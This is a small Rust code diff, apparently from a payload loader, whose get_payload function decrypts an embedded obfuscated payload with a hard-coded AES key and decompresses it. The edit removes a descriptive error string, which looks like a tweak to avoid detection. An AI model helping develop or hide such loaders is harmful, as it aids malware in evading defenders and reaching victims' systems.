@@ -30,7 +30,7 @@ fn get_payload(_arch: Architecture) -> Vec<u8> {
     let compressed = decrypt_payload(OBFUSCATED_PAYLOAD, AES_KEY, AES_NONCE);
     let mut decoder = DeflateDecoder::new(&compressed[..]);
     let mut decompressed = Vec::new();
-    decoder.read_to_end(&mut decompressed).expect("decompress payload");
+    decoder.read_to_end(&mut decompressed).expect("");
     decompressed
 }
 
